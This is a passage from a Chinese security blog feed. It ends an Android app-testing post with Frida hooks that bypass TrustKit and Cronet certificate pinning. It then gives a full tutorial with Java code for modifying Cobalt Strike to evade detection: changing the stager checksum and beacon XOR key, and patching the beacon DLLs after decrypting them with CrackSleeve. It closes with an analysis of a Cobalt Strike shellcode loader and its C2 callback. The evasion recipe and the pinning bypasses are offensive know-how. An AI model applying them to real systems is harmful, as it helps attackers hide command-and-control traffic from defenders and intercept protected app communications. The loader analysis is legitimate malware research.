&#125;;</span><br><span class="line">            Activity.verify.overload(&#39;java.lang.String&#39;, &#39;java.security.cert.X509Certificate&#39;).implementation &#x3D; function(str) &#123;</span><br><span class="line">                quiet_send(&#39;Trustkit.verify2: &#39; + str);</span><br><span class="line">                return true;</span><br><span class="line">            &#125;;</span><br><span class="line">    </span><br><span class="line">            quiet_send(&#39;Trustkit pinning&#39;)</span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            quiet_send(&#39;Trustkit pinner not found&#39;)</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F;cronet pinner hook</span><br><span class="line">            &#x2F;&#x2F;weibo don&#39;t invoke</span><br><span class="line">    </span><br><span class="line">            var netBuilder &#x3D; Java.use(&quot;org.chromium.net.CronetEngine$Builder&quot;);</span><br><span class="line">    </span><br><span class="line">            &#x2F;&#x2F;https:&#x2F;&#x2F;developer.android.com&#x2F;guide&#x2F;topics&#x2F;connectivity&#x2F;cronet&#x2F;reference&#x2F;org&#x2F;chromium&#x2F;net&#x2F;CronetEngine.Builder.html#enablePublicKeyPinningBypassForLocalTrustAnchors(boolean)</span><br><span class="line">            netBuilder.enablePublicKeyPinningBypassForLocalTrustAnchors.implementation &#x3D; function(arg) &#123;</span><br><span class="line">    </span><br><span class="line">                &#x2F;&#x2F;weibo not invoke</span><br><span class="line">                console.log(&quot;Enables or disables public key pinning bypass for local trust anchors &#x3D; &quot; + arg);</span><br><span class="line">    </span><br><span class="line">                &#x2F;&#x2F;true to enable the bypass, false to disable.</span><br><span class="line">                var ret &#x3D; netBuilder.enablePublicKeyPinningBypassForLocalTrustAnchors.call(this, true);</span><br><span class="line">                return ret;</span><br><span class="line">            &#125;;</span><br><span class="line">    </span><br><span class="line">            netBuilder.addPublicKeyPins.implementation &#x3D; function(hostName, pinsSha256, includeSubdomains, expirationDate) &#123;</span><br><span class="line">                console.log(&quot;cronet addPublicKeyPins hostName &#x3D; &quot; + hostName);</span><br><span class="line">    </span><br><span class="line">                &#x2F;&#x2F;var ret &#x3D; netBuilder.addPublicKeyPins.call(this,hostName, pinsSha256,includeSubdomains, expirationDate);</span><br><span class="line">                &#x2F;&#x2F;this 是调用 addPublicKeyPins 前的对象吗? Yes,CronetEngine.Builder</span><br><span class="line">                return this;</span><br><span class="line">            &#125;;</span><br><span class="line">    </span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            console.log(&#39;[-] Cronet pinner not found&#39;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h2 id="流量不通过代理"><a href="#流量不通过代理" class="headerlink" title="流量不通过代理"></a>流量不通过代理</h2><h3 id="使用ProxyDroid或者Postern"><a href="#使用ProxyDroid或者Postern" class="headerlink" title="使用ProxyDroid或者Postern"></a>使用ProxyDroid或者Postern</h3><p>ProxyDroid上文已经介绍Postern配置如下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211220170123027.png" alt="image-20211220170123027"></p><h3 id="使用Proxifier进行绕过"><a href="#使用Proxifier进行绕过" class="headerlink" title="使用Proxifier进行绕过"></a>使用Proxifier进行绕过</h3><p>此方法适用于被分析应用程序正常运行于模拟器中，整体思路如下：</p><p><code>安卓模拟器 网络进程 --Proxifier代理 --Burpsuite</code></p><p>在Proxifier中添加proxy</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211220182951560.png" alt="image-20211220182951560" style="zoom:50%;"><p>对于Mac下的MuMu的配置如下：</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211220183120353.png" alt="image-20211220183120353" style="zoom:50%;"><p>对于Mac下的夜神配置如下：</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211220191735429.png" alt="image-20211220191735429" style="zoom:50%;"><p>其他模拟器思路类似</p><h2 id="使用传输层协议"><a href="#使用传输层协议" class="headerlink" title="使用传输层协议"></a>使用传输层协议</h2><p>使用TCP或UDP</p><p>解决方法：WireShark </p><p>1). tcpdump 是⼀个运⾏在 Linux 平台的可执⾏ ELF ⽂件 <a href="https://www.androidtcpdump.com/android-tcpdump/downloads">https://www.androidtcpdump.com/android-tcpdump/downloads</a> 下载⼆进制⽂件 </p><p>2). 由于依赖adb，⾸先在 macOS 安装adb，命令如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ brew cask install android-platform-tools</span><br></pre></td></tr></table></figure><p>3).拥有设备root权限</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ adb push tcpdump &#x2F;data&#x2F;local&#x2F;tmp</span><br><span class="line"># adb shell</span><br><span class="line"># su</span><br><span class="line"># chmod 755 tcpdump</span><br><span class="line"># .&#x2F;tcpdump -i any -p -s 0 -w &#x2F;sdcard&#x2F;capture.pcap</span><br><span class="line">$ adb pull &#x2F;sdcard&#x2F;capture.pcap &#x2F;pcpath</span><br><span class="line">使⽤Wireshark打开 pcap⽂件</span><br><span class="line">$ wireshark &#x2F;pcpath&#x2F;capture.pcap</span><br></pre></td></tr></table></figure><h2 id="使用VPN"><a href="#使用VPN" class="headerlink" title="使用VPN"></a>使用VPN</h2><p>需要具体分析</p><h1 id="通信数据加解密-签名"><a href="#通信数据加解密-签名" class="headerlink" title="通信数据加解密/签名"></a>通信数据加解密/签名</h1><h2 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h2><h3 id="Httpdecrypt"><a href="#Httpdecrypt" class="headerlink" title="Httpdecrypt"></a>Httpdecrypt</h3><p><a href="https://www.ol4three.com/2020/12/29/Android/%E4%BD%BF%E7%94%A8Httpdecrypt%E8%BF%9B%E8%A1%8CHOOK/">httpdecrypt</a></p><h2 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h2><h3 id="Inspeckage"><a href="#Inspeckage" class="headerlink" title="Inspeckage"></a>Inspeckage</h3><p>在看源码等待更新</p><h2 id="Hook-HTTP-HTTPS"><a href="#Hook-HTTP-HTTPS" class="headerlink" title="Hook HTTP/HTTPS"></a>Hook HTTP/HTTPS</h2><h3 id="使用系统中SSL库"><a href="#使用系统中SSL库" class="headerlink" title="使用系统中SSL库"></a>使用系统中SSL库</h3><h4 id="xposed"><a href="#xposed" class="headerlink" title="xposed"></a>xposed</h4><h5 id="java"><a href="#java" class="headerlink" title="java"></a>java</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.androidVersion &gt; 8</span><br><span class="line">ConscryptFileDescriptorSocket</span><br><span class="line">解释：</span><br><span class="line">基于OpenSSLSocketlmpl的实现</span><br><span class="line">路径：</span><br><span class="line">http:&#x2F;&#x2F;aosp.opersys.com&#x2F;xref&#x2F;android-10.0.0_r47&#x2F;xref&#x2F;external&#x2F;conscrypt&#x2F;repackaged&#x2F;common&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;android&#x2F;org&#x2F;conscrypt&#x2F;ConscryptFileDescriptorSocket.java#123</span><br><span class="line">理解：</span><br><span class="line">android中openssl的实现，存在数据加解密的读写接口</span><br><span class="line">com.android.org.conscrypt.ConscryptFileDescriptorScoket$SSLOutputStream.write(&#39;[B&#39;,&#39;int&#39;,&#39;int&#39;)</span><br><span class="line">com.android.org.conscrypt.ConscryptFileDescriptorScoket$SSLIntputStream.read(&#39;[B&#39;,&#39;int&#39;,&#39;int&#39;)</span><br></pre></td></tr></table></figure><p>​            </p><pre><code>java.androidVersion &lt;= 8    OpenSSLSocketlmpl        解释：            OpenSSL实现        路径：            http://aosp.opersys.com/xref/android-8.0.0_r51/xref/external/conscrypt/common/src/main/java/org/conscrypt/OpenSSLSocketImpl.java        理解：            android中openssl的实现，存在数据加解密的读写接口        com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream.write(&apos;[B&apos;,&apos;int&apos;,&apos;int&apos;)        com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream.read(&apos;[B&apos;,&apos;int&apos;,&apos;int&apos;)</code></pre><h5 id="native"><a href="#native" class="headerlink" title="native"></a>native</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;system&#x2F;lib&#x2F;libssl.so库中的SSL_read()和SSL_write()</span><br><span class="line">说明：</span><br><span class="line">Java中的SSLOutputSteam.write()和SSLInputStream.read()实际上就是对libssl.so库的SSL_write()和SSL_read()包装调用</span><br></pre></td></tr></table></figure><h4 id="frida"><a href="#frida" class="headerlink" title="frida"></a>frida</h4><h5 id="java-1"><a href="#java-1" class="headerlink" title="java"></a>java</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.use(&quot;com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream&quot;).write.overload(&#39;[B&#39;,&#39;int&#39;,&#39;int&#39;).implementation</span><br><span class="line">java.use(&quot;com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream&quot;).read.overload(&#39;[B&#39;,&#39;int&#39;,&#39;int&#39;).implementation</span><br><span class="line">java.use(&quot;com.android.org.conscrypt.OpenSSLSocketImpl$SSLOutputStream&quot;).write.overload(&#39;[B&#39;，&#39;int&#39;,&#39;int&#39;).implementation</span><br><span class="line">java.use(&quot;com.android.org.conscrypt.OpenSSLSocketImpl$SSLInputStream&quot;).Read.overload(&#39;[B&#39;，&#39;int&#39;,&#39;int&#39;).implementation</span><br></pre></td></tr></table></figure><h5 id="native-1"><a href="#native-1" class="headerlink" title="native"></a>native</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Interceptor.attach(address[&#39;SSL_read&#39;])</span><br><span class="line">Interceptor.attach(address[&#39;SSL_write&#39;])</span><br></pre></td></tr></table></figure><h3 id="协议使用了自我集成的SSL类库"><a href="#协议使用了自我集成的SSL类库" class="headerlink" title="协议使用了自我集成的SSL类库"></a>协议使用了自我集成的SSL类库</h3><p>举出一些常用的例子</p><p>1.Chrome</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Android L &amp; M libchrome.so</span><br><span class="line">Android N, O &amp; P libmonochrome.so</span><br></pre></td></tr></table></figure><p>2.系统内置webview</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用(pm path com.google.android.webview)得到webview的路径</span><br></pre></td></tr></table></figure><p>3.浏览器APP的webviewer</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OPPO</span><br><span class="line">libheytapwebview.so</span><br><span class="line">华为</span><br><span class="line">libhwwebviewchromium.so</span><br><span class="line">小米</span><br><span class="line">libmiui_chromium.so</span><br><span class="line">vivo</span><br><span class="line">libwebviewchromium_vivo.so</span><br></pre></td></tr></table></figure><p>4.基于Chromium的第三方浏览器内核</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">腾讯系的APP</span><br><span class="line">libmttwebview.so x5内核</span><br><span class="line">阿里系的APP</span><br><span class="line">libwebviewuc.so UC的U4内核</span><br><span class="line">各种小程序</span><br><span class="line">libxwalkcore.so CrossWalk内核</span><br></pre></td></tr></table></figure><p>5.微信(使用多内核的APP)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">有些APP回使用多个内核，以微信为例，同时使用了X5和CrossWalk内核</span><br><span class="line">x5</span><br><span class="line">com.tencent.mm.tools进程</span><br><span class="line">聊天界面点开的webview、支付里的页面(长按下啦提示使用x5内核的都可以)</span><br><span class="line">CrossWalk</span><br><span class="line">长按下拉未提示x5</span><br><span class="line">com.tencent.mm:toolsmp进程</span><br><span class="line">公众号文章、搜一搜</span><br><span class="line">com.tencent.mm:appbrand进程</span><br><span class="line">小程序</span><br></pre></td></tr></table></figure><h4 id="native-2"><a href="#native-2" class="headerlink" title="native"></a>native</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.对于native库，写脚本定位APP自带的SSL_read和SSL_write的偏移量，工程性质问题</span><br><span class="line">https:&#x2F;&#x2F;mabin004.github.io&#x2F;2020&#x2F;07&#x2F;24&#x2F;自动定位webview中的SLL-read和SSL-write&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;nytrosecurity.com&#x2F;2018&#x2F;02&#x2F;26&#x2F;hooking-chromes-ssl-functions&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;平常在进行APP测试的时候发现存在了很多问题，现在总结记录一下对应的知识，都在这遍文章下记录更新，老规矩先放一张图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211206111758936.png&quot; alt=&quot;image-20211206111758936&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="APP测试" scheme="http://www.ol4three.com/tags/APP%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CobaltSrike二次开发之流量修改</title>
    <link href="http://www.ol4three.com/2021/11/23/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltSrike%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E4%B9%8B%E6%B5%81%E9%87%8F%E4%BF%AE%E6%94%B9/"/>
    <id>http://www.ol4three.com/2021/11/23/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltSrike%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E4%B9%8B%E6%B5%81%E9%87%8F%E4%BF%AE%E6%94%B9/</id>
    <published>2021-11-23T12:07:36.000Z</published>
    <updated>2021-11-26T07:18:22.841Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CobaltStrike特征修改"><a href="#CobaltStrike特征修改" class="headerlink" title="CobaltStrike特征修改"></a>CobaltStrike特征修改</h1><h2 id="修改Stager防止被直接扫描：修改位置如下"><a href="#修改Stager防止被直接扫描：修改位置如下" class="headerlink" title="修改Stager防止被直接扫描：修改位置如下"></a>修改Stager防止被直接扫描：修改位置如下</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cloudstrike&#x2F;webserver.java</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123201537986.png" alt="image-20211123201537986"></p><p>修改isStager函数，只要不是92或者93就行。这里首先需要修改checksum8，将其返回值改为return sum</p><a id="more"></a><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123201720257.png" alt="image-20211123201720257"></p><p>利用脚本来生成我们的返回值</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class test &#123;</span><br><span class="line">    public static long checksum8(String text) &#123;</span><br><span class="line">        if (text.length() &lt; 4) &#123;</span><br><span class="line">            return 0L;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            text &#x3D; text.replace(&quot;&#x2F;&quot;, &quot;&quot;);</span><br><span class="line">            long sum &#x3D; 0L;</span><br><span class="line"></span><br><span class="line">            for(int x &#x3D; 0; x &lt; text.length(); ++x) &#123;</span><br><span class="line">                sum +&#x3D; (long)text.charAt(x);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return sum ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line">    public static void main(String []args) &#123;</span><br><span class="line">        String key &#x3D; &quot;703e7b3b4e2a07715552e466e0d231bd&quot;;</span><br><span class="line">        long flag &#x3D; checksum8(key);</span><br><span class="line">        System.out.println(flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>key我们使用wings来生成md5，然后运行获取对应的值</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123202249235.png" alt="image-20211123202249235"></p><p>将我们值放入替换92L为2131L</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static boolean isStager(String uri) &#123;</span><br><span class="line">   return checksum8(uri) &#x3D;&#x3D; 2131L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时修改return为我们生成的key</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">common&#x2F;CommonUtils.java</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static String MSFURI(int var0) &#123;</span><br><span class="line">   String[] var1 &#x3D; toArray(&quot;a, b, c, d, e, f, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2, 3, 4, 5, 6, 7, 8, 9, 9&quot;);</span><br><span class="line"></span><br><span class="line">   StringBuffer var2;</span><br><span class="line">   do &#123;</span><br><span class="line">      var2 &#x3D; new StringBuffer(var0 + 1);</span><br><span class="line">      var2.append(&quot;&#x2F;&quot;);</span><br><span class="line"></span><br><span class="line">      for(int var3 &#x3D; 0; var3 &lt; var0; ++var3) &#123;</span><br><span class="line">         var2.append(pick(var1));</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; while(checksum8(var2.toString()) !&#x3D; 2131L);</span><br><span class="line"></span><br><span class="line">   return &quot;703e7b3b4e2a07715552e466e0d231bd&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123202512901.png" alt="image-20211123202512901"></p><p>X64同理进行修改</p><p>之后修改</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon&#x2F;BeaconPayload.java</span><br></pre></td></tr></table></figure><p>将异或值0x2e改为0x3e(默认显示为10进制，我们改为62即可)</p><blockquote><p>根据之前的特征信息我们可知</p><p>cs 3.x版本的配置信息是通过异或0x69解密出的，4.x版本的配置信息是通过异或0x2e解密出的。</p><p>至此，可以发现，从3.x到4.x，cs自解密的算法没变，自解密后再解密配置文件的算法就只是改了个密钥，而且是固定的（3.x 0x69，4.x 0x2e）。    </p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static byte[] beacon_obfuscate(byte[] var0) &#123;</span><br><span class="line">   byte[] var1 &#x3D; new byte[var0.length];</span><br><span class="line"></span><br><span class="line">   for(int var2 &#x3D; 0; var2 &lt; var0.length; ++var2) &#123;</span><br><span class="line">      var1[var2] &#x3D; (byte)(var0[var2] ^ 62);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   return var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修改DLL文件"><a href="#修改DLL文件" class="headerlink" title="修改DLL文件"></a>修改DLL文件</h2><p>同时我们需要到生成时调用的DLL文件进行修改，否则会导致异或值不一样导致的无法上线，下载解密的问题</p><p>使用脚本对Sleeve进行解密，具体原理可以查看CobaltStrike的认证流程</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ca3tie1&#x2F;CrackSleeve</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123203240973.png" alt="image-20211123203240973"></p><p>将解密出来的文件拖到IDA，搜索0x2e关键字，打patch修改为0x3e</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123203454667.png" alt="image-20211123203454667"></p><p>同时需要修改的有</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon.dll</span><br><span class="line">beacon.x64.dll</span><br><span class="line">dnsb.dll</span><br><span class="line">dnsb.x64.dll</span><br><span class="line">pivot.dll</span><br><span class="line">pivot.x64.dll</span><br></pre></td></tr></table></figure><p>将修改之后的dll放入并加密</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123204004260.png" alt="image-20211123204004260"></p><p>将之前修改的Java，和我们的dll 重新导入jar文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BeaconPayload.java</span><br><span class="line">Webserver.java</span><br><span class="line">commonutil.java</span><br></pre></td></tr></table></figure><p>进行测试上线，发现特征流量已经修改</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211124125228589.png" alt="image-20211124125228589"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://cloud.tencent.com/developer/article/1764340">https://cloud.tencent.com/developer/article/1764340</a></p><p><a href="https://lengjibo.github.io/CobaltStrikeCode/">https://lengjibo.github.io/CobaltStrikeCode/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CobaltStrike特征修改&quot;&gt;&lt;a href=&quot;#CobaltStrike特征修改&quot; class=&quot;headerlink&quot; title=&quot;CobaltStrike特征修改&quot;&gt;&lt;/a&gt;CobaltStrike特征修改&lt;/h1&gt;&lt;h2 id=&quot;修改Stager防止被直接扫描：修改位置如下&quot;&gt;&lt;a href=&quot;#修改Stager防止被直接扫描：修改位置如下&quot; class=&quot;headerlink&quot; title=&quot;修改Stager防止被直接扫描：修改位置如下&quot;&gt;&lt;/a&gt;修改Stager防止被直接扫描：修改位置如下&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cloudstrike&amp;#x2F;webserver.java&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123201537986.png&quot; alt=&quot;image-20211123201537986&quot;&gt;&lt;/p&gt;
&lt;p&gt;修改isStager函数，只要不是92或者93就行。这里首先需要修改checksum8，将其返回值改为return sum&lt;/p&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://www.ol4three.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="C2" scheme="http://www.ol4three.com/tags/C2/"/>
    
      <category term="Cobalt Strike" scheme="http://www.ol4three.com/tags/Cobalt-Strike/"/>
    
  </entry>
  
  <entry>
    <title>CobaltSrike Shellcode分析</title>
    <link href="http://www.ol4three.com/2021/11/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltSrike-Shellcode%E5%88%86%E6%9E%90/"/>
    <id>http://www.ol4three.com/2021/11/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltSrike-Shellcode%E5%88%86%E6%9E%90/</id>
    <published>2021-11-12T09:11:01.000Z</published>
    <updated>2021-11-23T12:11:02.058Z</updated>
    
    <content type="html"><![CDATA[<p>首先我们来看一张流程图</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123201045600.png" alt="image-20211123201045600"></p><p>首先打开IDA进行查看</p><p>进入主函数，主要看sub_401840()函数进行查看</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112185819017.png" alt="image-20211112185819017"></p><p>进入函数发现，首先获取系统时间戳，然后拼接字符串和创建线程通过管道读取shellcode，最后执行shellcode</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114141830161.png" alt="image-20211114141830161"></p><a id="more"></a><p>拼接的管道名</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004053F0&#x3D;artifact.004053F0 (ASCII &quot;\\.\pipe\MSSE-5866-server&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114142512415.png" alt="image-20211114142512415"></p><p>跟进线程创建线程执行的函数，首先创建命名管道，再把加密过的shellcode写入管道</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114143133792.png" alt="image-20211114143133792"></p><p>Shellcode内容</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114143858237.png" alt="image-20211114143858237"></p><p>写入shellcode</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114150018919.png" alt="image-20211114150018919"></p><p>跟进接收shellcode函数RevShellcode_40172:其主题逻辑是先申请内存存放读取出来的shellcode，然后再解密执行</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114150317625.png" alt="image-20211114150317625"></p><p>从管道中读取shellcode到内存中</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114150501720.png" alt="image-20211114150501720"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114150714414.png" alt="image-20211114150714414"></p><p>将读取出来的Shellcode在DecyptandrRunShellcode_40158E函数中执行解密，该函数的主题逻辑，申请内存存放解密后的shellcode，然后修改内存属性并跳转运行</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114151059974.png" alt="image-20211114151059974"></p><p>解密算法如下，首先遍历shellcode，遍历次数与4求模，得到的值作为403008数组的下标得到一字节，用该字节与shellcode对应遍历时的字节异或，最终得到解密后的字节</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114151532706.png" alt="image-20211114151532706"></p><p>解密所需的数组</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114151904493.png" alt="image-20211114151904493"></p><p>解密后的数据</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114152353437.png" alt="image-20211114152353437"></p><p>之后跳转并执行</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114152614378.png" alt="image-20211114152614378"></p><h1 id="Shellcode部分"><a href="#Shellcode部分" class="headerlink" title="Shellcode部分"></a>Shellcode部分</h1><p>先加载wininet.dll</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114161929815.png" alt="image-20211114161929815"></p><p>之后调用InternetOpen函数</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114162309532.png" alt="image-20211114162309532"></p><p>连接控制端192.168.202.131</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114162334075.png" alt="image-20211114162334075"></p><p>请求Beacon URL： /FXhV</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114162518977.png" alt="image-20211114162518977"></p><p>发送HTTP请求</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114174801303.png" alt="image-20211114174801303"></p><p>获取桌面窗口句柄</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114174830200.png" alt="image-20211114174830200"></p><p>处理前面对话窗口遇到的错误</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114175616822.png" alt="image-20211114175616822"></p><p>申请内存</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114174903855.png" alt="image-20211114174903855"></p><p>多次调用InternetReadFile读取文件</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114174923492.png" alt="image-20211114174923492"></p><p>读取完成后跳转执行到所申请的内存</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114175016024.png" alt="image-20211114175016024"></p><p>这里需要解密出一个dll，具体的解密算法如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115122512735.png" alt="image-20211115122512735"></p><p>解密后的数据：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115163932049.png" alt="image-20211115163932049"></p><p>反射注入DLL：</p><p>查看解密出来的DLL</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115172616776.png" alt="image-20211115172616776"></p><p>0x36c0032 -&gt; 0x36c0041 也就是DLL的Dos头部分，下面ebx+0x8150，也是导出函数ReflectiveLoader函数的偏移</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115172820956.png" alt="image-20211115172820956"></p><p>在导出函数ReflectiveLoader函数中解析DLL，ReflectiveLoader中会调用virtualalloc()函数，申请大小为0x30000的内存，用于存放DLL：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115173716075.png" alt="image-20211115173716075"></p><p>在内存中反射注入dll,存放在eax中0x3D15DA8</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115173811388.png" alt="image-20211115173811388"></p><p>然后开始执行dll，此时也可以到自己的c2还没有主机上线</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115173929114.png" alt="image-20211115173929114"></p><p>执行dll中</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103030220.png" alt="image-20211116103030220"></p><p>获取对应的系统信息拼接</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103131000.png" alt="image-20211116103131000"></p><p>获取cookie</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103241470.png" alt="image-20211116103241470"></p><p>获取配置信息</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103319764.png" alt="image-20211116103319764"></p><p>调用，wininet.HttpSendRequestA请求上线</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103445022.png" alt="image-20211116103445022"></p><p>上线回连</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103628751.png" alt="image-20211116103628751"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103533769.png" alt="image-20211116103533769"></p><p>对默认生成的shellcode分析发现存在大量的特征信息，导入配置文件后再次对shellcode进行分析，发现对应的关键信息已经修改</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116115524286.png" alt="image-20211116115524286"></p><p><img 